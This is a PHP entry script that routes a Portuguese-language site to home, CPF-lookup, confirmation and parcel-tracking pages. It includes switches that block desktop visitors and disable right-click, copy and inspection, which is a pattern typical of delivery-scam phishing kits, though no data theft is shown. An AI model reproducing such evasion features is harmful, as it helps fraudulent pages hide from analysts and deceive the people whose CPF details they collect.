<?php

$link_pasta_local = '';

if (!isset($config_dominio_site)) {
    echo 'erro...';
    die();
}

define('TITULO_SITE', $config_titulo_site);

if (!(str_starts_with($config_dominio_site, 'http') || strpos($config_dominio_site, 'http') === 0)) {
    $config_dominio_site = 'https://' . $config_dominio_site;
}
if (!(str_ends_with($config_dominio_site, '/') || substr($config_dominio_site, -1) === '/')) {
    $config_dominio_site = $config_dominio_site . '/';
}

session_start();
date_default_timezone_set('America/Sao_Paulo');

$uri_geral = isset($_GET['url']) ? $_GET['url'] : '';
$uri_1 = isset(explode('/', $uri_geral)[0]) ? explode('/', $uri_geral)[0] : false;
$uri_2 = isset(explode('/', $uri_geral)[1]) ? explode('/', $uri_geral)[1] : false;
$uri_3 = isset(explode('/', $uri_geral)[2]) ? explode('/', $uri_geral)[2] : false;

$url_full = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$tipo_ambiente = isset(explode('/', $url_full)[2]) && explode('/', $url_full)[2] == 'localhost' ? 'local' : 'web';

if ($tipo_ambiente == 'local') {
    define('LINK_DOMINIO', $link_pasta_local);
    $bloquear_inspecionar = false;
    $bloquear_desktop = false;
} else {
    define('LINK_DOMINIO', $config_dominio_site);
    if ($config_permitir_inspecionar) {
        $bloquear_inspecionar = false;
    } else {
        $bloquear_inspecionar = true;
    }
    if ($config_permitir_computadores) {
        $bloquear_desktop = false;
    } else {
        $bloquear_desktop = true;
    }
}

if ($bloquear_inspecionar && false) {
    $atributos_body = ' onselectstart="return false" ondragstart="return false" oncontextmenu="return false" oncopy="return false"';
} else {
    $atributos_body = '';
}

if (false) {
    $bloquear_inspecionar = true;
    $bloquear_desktop = true;
}

define('FILES', LINK_DOMINIO . 'files/');

include('files/php/functions.php');
include('files/php/icons.php');

include('files/components/html_inicio.php');
switch ($uri_1) {
    case '':
        include('files/pages/home.php');
        break;

    case 'home':
        include('files/pages/home.php');
        break;

    case 'acompanhe':
        include('files/pages/cpf.php');
        break;

    case 'confirmacao':
        include('files/pages/confirmacao.php');
        break;

    case 'rastreio':
        include('files/pages/rastreio.php');
        break;

    default:
        include('files/pages/home.php');
        break;
}
include('files/components/html_fim.php');
